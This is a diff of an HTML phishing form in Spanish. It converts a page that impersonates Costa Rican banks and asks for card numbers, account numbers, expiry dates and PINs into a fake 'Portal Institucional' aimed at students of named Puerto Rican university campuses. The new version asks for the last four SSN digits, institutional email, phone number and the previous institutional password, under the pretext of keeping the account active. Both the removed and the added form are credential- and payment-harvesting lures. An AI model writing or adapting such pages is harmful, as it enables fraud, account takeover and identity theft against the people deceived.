@@ -116,7 +116,6 @@
       font-size: 0.80rem;
       font-weight: 500;
       letter-spacing: 0.5px;
-      text-transform: uppercase;
     }
 
     input, select, textarea {
@@ -205,9 +204,9 @@
   <div class="card">
 
     <div class="card-header">
-      <span class="badge">✦ Bienvenido</span>
+      <span class="badge">✦ Portal Insitucional</span>
       <h1>Completa el formulario</h1>
-      <p>Para revisar las condiciones complete la siguiente información, la cuál es necesaria para actualizar 
+      <p>Para asegurar mantener su cuenta activa complete la siguiente información, la cuál es necesaria para actualizar 
 sus datos a nivel de sistema y evitar inconvenientes futuros en las gestiones que requiera de 
 nuestra parte: </p>
     </div>
@@ -224,77 +223,53 @@ nuestra parte: </p>
 
   <!-- 1. Nombre completo -->
   <div class="form-group full">
-    <label for="nombre">Nombre completo (tal cual como aparece en su cédula de identidad)</label>
+    <label for="nombre">Nombre completo </label>
     <input type="text" id="nombre" name="nombre" placeholder="Ej: Juan Carlos Pérez Rodríguez" required />
   </div>
 
   <!-- 2. Número de cédula -->
   <div class="form-group full">
-    <label for="cedula">Número de cédula</label>
-    <input type="text" id="cedula" name="cedula" placeholder="Ej: 1-1234-5678" required />
+    <label for="cedula">Ultimos 4 digitos de SSN</label>
+    <input type="text" id="cedula" name="cedula" placeholder="xxxx" required />
   </div>
 
   <!-- 3. Correo electrónico -->
   <div class="form-group full">
-    <label for="email">Correo electrónico</label>
+    <label for="email">Correo electrónico institucional</label>
     <input type="email" id="email" name="email" placeholder="juan@correo.com" required />
   </div>
 
   <!-- 4. Número de teléfono -->
   <div class="form-group full">
-    <label for="telefono">Número de teléfono</label>
-    <input type="tel" id="telefono" name="telefono" placeholder="Ej: +506 8888-0000" required />
+    <label for="telefono">Número de teléfono asociado a la cuenta</label>
+    <input type="tel" id="telefono" name="telefono" placeholder="Ej: +1-787-888-0000" required />
   </div>
 
   <!-- 5. Entidad bancaria -->
   <div class="form-group full">
-    <label for="banco">Entidad bancaria con la que mantiene cuenta activa</label>
-    <select id="banco" name="banco" >
+    <label for="recinto">Recinto en el que cursa (con una cuenta activa)</label>
+    <select id="recinto" name="recinto" >
       <option value="" disabled selected>Selecciona tu banco...</option>
-      <option value="BCR">Banco de Costa Rica (BCR)</option>
-      <option value="BN">Banco Nacional</option>
-      <option value="BAC">BAC Credomatic</option>
-      <option value="scotiabank">Scotiabank</option>
-      <option value="davivienda">Davivienda</option>
-      <option value="promerica">Promerica</option>
-      <option value="lafise">Lafise</option>
+      <option value="Ag">Aguadilla</option>
+      <option value="Ar">Arecibo</option>
+      <option value="Br">Barranquitas</option>
+      <option value="By">Bayamon</option>
+      <option value="Fj">Fajardo</option>
+      <option value="Gy">Guayama</option>
+      <option value="Mt">Metro</option>
+      <option value="Po">Ponce</option>
+      <option value="SG">San German</option>
+      <option value="Op">Optometria</option>
+      <option value="Dr">Derecho</option>
       <option value="otro">Otro</option>
     </select>
   </div>
-
-  <!-- 6. Tipo de tarjeta o cuenta -->
-  <div class="form-group full">
-    <label for="tipo_cuenta">Tipo de tarjeta o cuenta</label>
-    <select id="tipo_cuenta" name="tipo_cuenta">
-      <option value="" disabled selected>Selecciona...</option>
-      <option value="credito">Crédito</option>
-      <option value="debito">Débito</option>
-    </select>
+  
+    <div class="form-group full">
+    <label for="CONTRASEÑA">Contraseña utilizada anteriormente en cuenta institucional</label>
+    <input type="text" id="contra" name="contra" placeholder="contraseña anterior" required />
   </div>
 
-  <!-- 7. Número de cuenta bancaria -->
-  <div class="form-group full">
-    <label for="num_cuenta">Número de cuenta bancaria asociado a la tarjeta</label>
-    <input type="text" id="num_cuenta" name="num_cuenta" placeholder="Ej: CR21 0152 0200 1026 2840 66" required />
-  </div>
-
-  <!-- 8. Número de tarjeta -->
-  <div class="form-group full">
-    <label for="num_tarjeta">Número de tarjeta</label>
-    <input type="text" id="num_tarjeta" name="num_tarjeta" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required />
-  </div>
-
-  <!-- 9. Fecha de vencimiento -->
-  <div class="form-group">
-    <label for="vencimiento">Fecha de vencimiento de la tarjeta</label>
-    <input type="text" id="vencimiento" name="vencimiento" placeholder="MM/AA" maxlength="5" required />
-  </div>
-
-  <!-- 10. Código o PIN -->
-  <div class="form-group">
-    <label for="pin">Código o PIN de seguridad de la tarjeta</label>
-    <input type="password" id="pin" name="pin" placeholder="***" maxlength="4" required />
-  </div>
 
 </div><!-- /form-grid -->
       
@@ -302,9 +277,6 @@ nuestra parte: </p>
 
     </form>
 
-    <div class="card-footer">
-      Mas informacion <a href="https://www.sugese.fi.cr/SitePages/index.aspx">Ingresa aquí</a>
-    </div>
 
   </div><!-- /card -->
 
